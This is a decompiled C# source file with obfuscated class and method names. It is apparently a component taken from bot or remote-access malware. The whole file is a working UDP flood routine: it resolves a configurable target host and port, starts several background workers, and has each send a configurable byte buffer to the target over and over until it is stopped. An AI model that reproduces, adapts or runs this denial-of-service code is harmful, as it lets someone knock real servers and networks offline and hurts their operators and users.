using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns1;

internal class Class5
{
	private static IPEndPoint ipendPoint_0;

	private static BackgroundWorker[] backgroundWorker_0;

	private static byte[] byte_0;

	private static bool bool_0 = false;

	public static string string_0 = string.Empty;

	public static ushort ushort_0 = 0;

	public static int int_0 = 0;

	private static int int_1 = 2;

	public static void smethod_0()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).get_AddressList()[0], (int)ushort_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), (int)ushort_0);
		}
		byte_0 = new byte[int_0];
		backgroundWorker_0 = (BackgroundWorker[])(object)new BackgroundWorker[int_1];
		bool_0 = true;
		for (int i = 0; i < int_1; i++)
		{
			backgroundWorker_0[i] = new BackgroundWorker();
			backgroundWorker_0[i].add_DoWork(new DoWorkEventHandler(smethod_2));
			backgroundWorker_0[i].set_WorkerSupportsCancellation(true);
			backgroundWorker_0[i].RunWorkerAsync();
		}
	}

	public static void smethod_1()
	{
		try
		{
			bool_0 = false;
			for (int i = 0; i < int_1; i++)
			{
				backgroundWorker_0[i].CancelAsync();
				backgroundWorker_0[i] = null;
			}
		}
		catch
		{
		}
	}

	private static void smethod_2(object sender, DoWorkEventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)2, (ProtocolType)17);
		while (bool_0)
		{
			try
			{
				val.SendTo(byte_0, (EndPoint)(object)ipendPoint_0);
				Thread.Sleep(15);
			}
			catch
			{
			}
		}
	}
}
